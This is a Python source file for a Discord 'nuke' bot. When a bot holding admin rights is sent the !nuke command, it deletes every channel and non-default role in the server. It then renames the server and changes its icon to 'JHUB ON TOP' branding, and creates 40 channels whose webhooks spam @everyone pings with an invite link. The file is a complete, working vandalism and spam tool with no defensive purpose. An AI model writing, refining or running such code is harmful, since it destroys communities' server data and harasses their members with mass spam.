import discord
from discord.ext import commands
import os
import aiohttp
import asyncio

# Configuration
prefix = "!"
channel_name = "nuked-by-jhub"
webhook_name = "JHUB ON TOP"
webhook_pfp = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
guild_name = "JHUB ON TOP"
guild_icon = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
channels_to_create = 40
pings_per_channel = 100

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)

@bot.event
async def on_ready():
    print(f"✅ {bot.user} is online and ready.")

async def spam_webhook(webhook):
    for ping_count in range(pings_per_channel):
        try:
            await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
            if (ping_count + 1) % 10 == 0:
                print(f"Sent {ping_count + 1} pings in webhook {webhook.name}")
            await asyncio.sleep(0.1)  # delay between pings
        except Exception as e:
            print(f"❌ Webhook send failed: {e}")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    print("⚠️ Starting NUKE sequence...")

    # Delete channels safely
    channels = list(guild.channels)
    print(f"Deleting {len(channels)} channels...")
    for channel in channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"❌ Failed to delete channel {channel.name}: {e}")

    # Delete roles safely
    roles = list(guild.roles)
    print(f"Deleting {len(roles)} roles (except @everyone)...")
    for role in roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"Deleted role: {role.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"❌ Failed to delete role {role.name}: {e}")

    # Rename server and change icon
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(guild_icon) as resp:
                if resp.status == 200:
                    icon_data = await resp.read()
                    await guild.edit(name=guild_name, icon=icon_data)
                    print(f"Server renamed to '{guild_name}' and icon updated.")
                else:
                    print(f"Failed to download guild icon, HTTP {resp.status}")
    except Exception as e:
        print(f"❌ Failed to change server name/icon: {e}")

    # List to hold all spamming tasks
    spam_tasks = []

    print(f"Creating {channels_to_create} channels and starting spam immediately...")
    for i in range(channels_to_create):
        try:
            channel = await guild.create_text_channel(f"{channel_name}-{i}")
            print(f"Created channel: {channel.name}")

            webhook = await channel.create_webhook(name=webhook_name)
            print(f"Created webhook in {channel.name}")

            # Start spamming immediately as a background task
            task = asyncio.create_task(spam_webhook(webhook))
            spam_tasks.append(task)

            await asyncio.sleep(0.2)  # Small delay before creating next channel
        except Exception as e:
            print(f"❌ Failed to create channel or webhook for channel {i}: {e}")

    # Wait for all spam tasks to finish (optional, can be removed if you want to let them run forever)
    await asyncio.gather(*spam_tasks)

    print("✅ NUKE complete.")

if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("❌ Error: DISCORD_TOKEN environment variable not found.")
        exit(1)
    bot.run(token)
